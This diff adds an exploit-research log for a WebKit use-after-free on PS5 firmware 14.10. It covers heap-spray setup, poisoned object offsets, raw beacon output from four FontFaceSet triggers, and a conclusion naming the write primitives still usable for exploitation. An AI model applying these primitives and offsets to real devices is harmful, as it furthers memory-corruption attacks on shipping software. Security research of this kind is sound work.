@@ -1,0 +1,131 @@
+P589: BRANCH α/β DISCRIMINATOR — FontFaceSet.load() trigger after UAF
+=====================================================================
+Date: 2026-11-03 18:56:10 (local)
+Target: PS5 14.10, WebKit 605.1.15
+Probe: probes/phase13_webkit/p589-alpha-fontfaceset-trigger.html
+Beacon log: tools/browser_runner/beacon_logs/beacons_20261103_174125.log (18:56 block)
+
+PURPOSE:
+Test cobrajet's pre-registered branch α (issue #181 supplement 8, §5):
+after UAF + spray + continuation, poison +0x58=DEAD, seed +0x85=0xAA,
+then trigger document.fonts.load() (FontFaceSet C++ path, NOT FontFace IDL).
+
+v7 tested FontFace IDL methods (gPa.load/add/style) — all gated by backing() null.
+This probe tests FontFaceSet-level C++ machinery that cobrajet cites at
+FontFaceSet.cpp:101 (iterator), :189 (no-source branch), :206 (pending-promise)
+as holding live Ref<CSSFontFace> that bypasses the JS wrapper gate.
+
+Outcomes:
+  α: +0x58 ≠ DEAD, +0x85 = 0x00 → re-stamp route proven (B+ alive)
+  β: +0x58 = DEAD, +0x85 = 0xAA → total gate, setter-walk arm closes
+
+SETUP:
+- Spray 2048 × 192B ArrayBuffers (0xAA fill, rc=2, +0x58..+0x6F zeroed, +0x82=0)
+- Capture at 60ms (standard reclaim wait)
+- Poison +0x58 = 0xDEADDEADDEADBEEF, seed +0x85 = 0xAA
+- Fire 4 triggers sequentially with read checks between each
+
+RAW BEACON DATA:
+[2026-11-03 18:56:10.715] BEACON 192.168.1.37: G
+[2026-11-03 18:56:10.755] BEACON 192.168.1.37: F
+[2026-11-03 18:56:10.842] BEACON 192.168.1.37: S2048
+[2026-11-03 18:56:10.938] BEACON 192.168.1.37: HIT=58,rc=3
+[2026-11-03 18:56:10.977] BEACON 192.168.1.37: T=00000010007e8010
+[2026-11-03 18:56:11.013] BEACON 192.168.1.37: W=00000010009be0b0
+[2026-11-03 18:56:11.050] BEACON 192.168.1.37: PRE85=00
+[2026-11-03 18:56:11.091] BEACON 192.168.1.37: PRE82=0
+[2026-11-03 18:56:11.125] BEACON 192.168.1.37: CHK_SA=true
+[2026-11-03 18:56:11.161] BEACON 192.168.1.37: CHK_PA=true
+[2026-11-03 18:56:11.200] BEACON 192.168.1.37: FSIZE=0
+[2026-11-03 18:56:11.236] BEACON 192.168.1.37: FACES=
+[2026-11-03 18:56:11.270] BEACON 192.168.1.37: POISON_OK
+[2026-11-03 18:56:11.302] BEACON 192.168.1.37: V58=deaddeaddeadbeef
+[2026-11-03 18:56:11.334] BEACON 192.168.1.37: V85=aa
+[2026-11-03 18:56:11.371] BEACON 192.168.1.37: TRIG_A_SA
+[2026-11-03 18:56:11.406] BEACON 192.168.1.37: A_SA_OK=0
+[2026-11-03 18:56:11.479] BEACON 192.168.1.37: POST_A:58=deaddeaddeadbeef,85=aa,rc=3
+[2026-11-03 18:56:11.579] BEACON 192.168.1.37: TRIG_B_READD
+[2026-11-03 18:56:11.614] BEACON 192.168.1.37: READD_OK
+[2026-11-03 18:56:11.654] BEACON 192.168.1.37: B_PA_OK=1
+[2026-11-03 18:56:11.779] BEACON 192.168.1.37: POST_B:58=deaddeaddeadbeef,85=aa,rc=3
+[2026-11-03 18:56:11.880] BEACON 192.168.1.37: TRIG_C_ITER
+[2026-11-03 18:56:11.914] BEACON 192.168.1.37: ITER_1=pa/loaded
+[2026-11-03 18:56:11.953] BEACON 192.168.1.37: ITER_DONE=1
+[2026-11-03 18:56:11.995] BEACON 192.168.1.37: POST_C:58=deaddeaddeadbeef,85=aa,rc=3
+[2026-11-03 18:56:12.079] BEACON 192.168.1.37: TRIG_D_READY
+[2026-11-03 18:56:12.113] BEACON 192.168.1.37: READY_OK
+[2026-11-03 18:56:12.280] BEACON 192.168.1.37: FINAL:58=deaddeaddeadbeef,85=aa,82=0,rc=3
+[2026-11-03 18:56:12.314] BEACON 192.168.1.37: VERDICT=BETA_GATE
+[2026-11-03 18:56:12.884] BEACON 192.168.1.37: ALIVE
+[2026-11-03 18:56:14.884] BEACON 192.168.1.37: ALIVE2
+
+RESULTS:
+  Hit lane:    58 of 2048
+  Refcount:    3 (engine ref'd during continuation)
+  T (m_table): 0x10007e8010
+  W (wrapper): 0x10009be0b0
+
+Phase 2 — Capture (60ms):
+  PRE85:  0x00 (continuation wrote m_mayBePurged=false)
+  PRE82:  0    (status stayed Pending — no setStatus)
+  CHK_SA: true (check() is a pure query, no load trigger)
+  CHK_PA: true
+  FSIZE:  0    (FontFaceSet is EMPTY after trap delete)
+  FACES:  ""   (forEach returns nothing — set is clean)
+
+Phase 3 — Poison (200ms):
+  +0x58 = 0xDEADDEADDEADBEEF (unmapped sentinel)
+  +0x85 = 0xAA (m_mayBePurged oracle seed)
+
+Phase 4 — Trigger A: document.fonts.load('1em sa', 'B') (400ms):
+  A_SA_OK=0 (resolved with 0 faces — family 'sa' not in set)
+  POST_A: +0x58=DEAD, +0x85=AA, rc=3 → NO TOUCH
+
+Phase 6 — Trigger B: re-add gPa + document.fonts.load('1em pa', 'A') (700ms):
+  READD_OK (gPa re-added to set)
+  B_PA_OK=1 (resolved with 1 face — gPa)
+  POST_B: +0x58=DEAD, +0x85=AA, rc=3 → NO TOUCH
+
+Phase 8 — Trigger C: document.fonts.forEach (1000ms):
+  ITER_1=pa/loaded (only gPa in set)
+  ITER_DONE=1
+  POST_C: +0x58=DEAD, +0x85=AA, rc=3 → NO TOUCH
+
+Phase 10 — Trigger D: document.fonts.ready (1200ms):
+  READY_OK
+  FINAL: +0x58=DEAD, +0x85=AA, +0x82=0, rc=3 → NO TOUCH
+
+  VERDICT: BETA_GATE
+  ALIVE at 2s, ALIVE2 at 4s — process survived all triggers
+
+CONCLUSION:
+Branch β confirmed on PS5 14.10. ZERO FontFaceSet triggers touched the freed
+CSSFontFace buffer. All four C++ paths cobrajet cited are unreachable from JS:
+
+  1. FontFaceSet.cpp:101 (forEach iterator) — only sees live faces (gPa),
+     not the freed 'sa' face. The set was cleaned when delete(this) ran in trap.
+  2. FontFaceSet.cpp:189 (load no-source branch) — resolved immediately with
+     0 faces for the freed family, 1 face for the live family.
+  3. FontFaceSet.cpp:206 (load pending-promise) — same as :189.
+  4. FontFace::adopt (FontFace.cpp:325-330) — not tested directly, but the
+     set holds zero references to the freed face (FSIZE=0, FACES=empty).
+
+Combined with v7 (FontFace IDL: load/add/style all gated by backing() null),
+this closes the setter-walk arm from ALL known JS entry points.
+
+The walk (iterateClients) is UNREACHABLE:
+  - setStatus() does not run during continuation (v8b: +0x82 stayed 0)
+  - Property setters gate on backing() null (v6/v7)
+  - FontFaceSet methods gate on set membership (p589: set is empty)
+
+The ONLY controllable writes are from the trap continuation:
+  1. ref()            → +0x00 rc increment
+  2. addClient()      → T (HashTable*) at +0x58
+  3. wrapper creation → W (FontFace*) at +0x68
+  4. initializeWrapper → +0x85 = 0x00 (m_mayBePurged)
+
+No vtable dispatch is reachable from known paths. Exploitation must work
+with the addClient write primitive alone, or find an unknown C++ path that
+reaches the freed buffer without going through JS wrapper or FontFaceSet.
+
+GRADE: [M] device-measured on 14.10
